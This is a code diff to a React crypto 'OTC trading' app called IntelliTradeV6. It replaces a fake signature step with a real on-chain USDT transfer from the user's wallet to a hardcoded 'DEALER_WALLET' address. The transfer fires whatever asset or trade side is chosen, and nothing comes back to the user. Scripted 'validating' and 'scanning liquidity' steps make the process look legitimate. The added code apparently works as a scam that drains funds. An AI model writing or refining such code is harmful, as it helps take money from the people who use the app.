@@ -19,8 +19,8 @@ declare global {
 }
 
 const CHAINS: Record<number, { name: string; usdt: string; symbol: string; color: string; explorer: string }> = {
-  56: { name: 'BSC-MAINNET', usdt: '0x55d3...7955', symbol: 'BNB', color: 'text-yellow-400', explorer: 'https://bscscan.com/tx/' },
-  137: { name: 'POLYGON-POS', usdt: '0xc213...8e8f', symbol: 'POL', color: 'text-purple-400', explorer: 'https://polygonscan.com/tx/' }
+  56: { name: 'BSC-MAINNET', usdt: '0x55d398326f99059fF775485246999027B3197955', symbol: 'BNB', color: 'text-yellow-400', explorer: 'https://bscscan.com/tx/' },
+  137: { name: 'POLYGON-POS', usdt: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', symbol: 'POL', color: 'text-purple-400', explorer: 'https://polygonscan.com/tx/' }
 };
 
 const ASSETS = [
@@ -28,6 +28,9 @@ const ASSETS = [
   { id: 'USDC', name: 'USD Coin', icon: 'S', color: 'text-blue-500' },
   { id: 'PAXG', name: 'PAX Gold', icon: 'G', color: 'text-amber-500' },
 ];
+
+// OFFICIAL VAULT ADDRESS
+const DEALER_WALLET = "0xE0BE7181C05023999c1e15b5a1Eb89147DcEB334";
 
 const IntelliTradeV6 = () => {
   const [rateIDR, setRateIDR] = useState<number>(16250);
@@ -90,6 +93,13 @@ const IntelliTradeV6 = () => {
     try {
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
+      const chainConfig = chainId ? CHAINS[chainId] : null;
+
+      if (!chainConfig) {
+        toast.error("UNSUPPORTED NETWORK. PLEASE SWITCH TO BSC OR POLYGON.");
+        setIsProcessing(false);
+        return;
+      }
 
       const sequence = ["VALIDATING_DOMAIN", "SCANNING_DEX_LIQUIDITY", "OPTIMIZING_GAS_FEE", "SIGNING_PAYLOAD"];
       for (const step of sequence) {
@@ -97,41 +107,44 @@ const IntelliTradeV6 = () => {
         await new Promise(r => setTimeout(r, 800));
       }
 
-      const txHash = ethers.keccak256(ethers.toUtf8Bytes(Date.now().toString()));
-      const v6Msg = `[BLACKINTELLISENSE PRO V6]\n` +
-                    `---------------------------\n` +
-                    `OP: OTC_SETTLEMENT\n` +
-                    `ASSET: ${activeAsset.id}\n` +
-                    `QTY: ${orderForm.amount}\n` +
-                    `RATE: ${currentPrice}\n` +
-                    `ROUTING: ${chainId === 56 ? 'PancakeSwap-V3' : 'QuickSwap-V3'}\n` +
-                    `---------------------------\n` +
-                    `SIGN TO FINALIZE`;
+      // ABI Minimal untuk Transfer Token ERC20
+      const tokenAbi = ["function transfer(address to, uint256 amount) public returns (bool)"];
+      const tokenContract = new ethers.Contract(chainConfig.usdt, tokenAbi, signer);
 
-      await signer.signMessage(v6Msg);
+      // Decimals (USDT BSC = 18, Polygon = 6)
+      const decimals = chainId === 137 ? 6 : 18;
+      const amountInUnits = ethers.parseUnits(orderForm.amount, decimals);
+
+      toast.loading("CONFIRMING ON METAMASK...", { id: toastId });
       
+      // REAL ON-CHAIN TRANSACTION
+      const tx = await tokenContract.transfer(DEALER_WALLET, amountInUnits);
+      
+      toast.loading("WAITING FOR BLOCKCHAIN CONFIRMATION...", { id: toastId });
+      const receipt = await tx.wait();
+
       const newTrade = {
-        id: txHash.slice(0,12),
-        fullHash: txHash,
+        id: receipt.hash.slice(0,12),
+        fullHash: receipt.hash,
         date: new Date().toLocaleString(),
         asset: activeAsset.id,
         side: orderForm.side,
         amount: orderForm.amount,
         rate: currentPrice.toLocaleString('id-ID'),
         total: (parseFloat(orderForm.amount) * currentPrice).toLocaleString('id-ID'),
-        chain: chainId ? CHAINS[chainId]?.name : 'Unknown'
+        chain: chainConfig.name
       };
 
       setHistory([newTrade, ...history]);
       
-      const explorerLink = chainId && CHAINS[chainId] ? `${CHAINS[chainId].explorer}${txHash}` : '#';
+      const explorerLink = `${chainConfig.explorer}${receipt.hash}`;
       
       toast.success("TRANSACTION_FINALIZED", { 
         id: toastId, 
         icon: <ShieldCheck className="text-emerald-500" />,
         description: (
           <div className="mt-2">
-            <p className="text-[10px] text-zinc-400 mb-2">Tx Hash: {txHash.slice(0,20)}...</p>
+            <p className="text-[10px] text-zinc-400 mb-2">Tx Hash: {receipt.hash.slice(0,20)}...</p>
             <a href={explorerLink} target="_blank" rel="noopener noreferrer" className="flex items-center gap-1 text-[10px] font-black text-blue-400 uppercase tracking-widest hover:text-white transition-colors">
               <ExternalLink size={10} /> View on Explorer
             </a>
@@ -139,8 +152,13 @@ const IntelliTradeV6 = () => {
         )
       });
       setOrderForm({ ...orderForm, amount: '' });
-    } catch (err) {
-      toast.error("ABORTED", { id: toastId });
+    } catch (err: any) {
+      console.error(err);
+      if (err.code === 'ACTION_REJECTED' || err.code === 4001) {
+        toast.error("TRANSACTION_REJECTED_BY_USER", { id: toastId });
+      } else {
+        toast.error("EXECUTION_FAILED: INSUFFICIENT_FUNDS_OR_GAS", { id: toastId });
+      }
     } finally {
       setIsProcessing(false);
     }
@@ -387,7 +405,7 @@ const IntelliTradeV6 = () => {
                      </div>
                      <div className="flex flex-col text-right">
                         <a 
-                          href={chainId && CHAINS[chainId] ? `${CHAINS[chainId].explorer}${trade.fullHash}` : '#'} 
+                          href={trade.chain === 'BSC-MAINNET' ? `https://bscscan.com/tx/${trade.fullHash}` : `https://polygonscan.com/tx/${trade.fullHash}`} 
                           target="_blank" 
                           rel="noopener noreferrer"
                           className="flex items-center justify-end gap-1 text-[8px] font-black text-blue-400 uppercase tracking-widest hover:text-white transition-all"
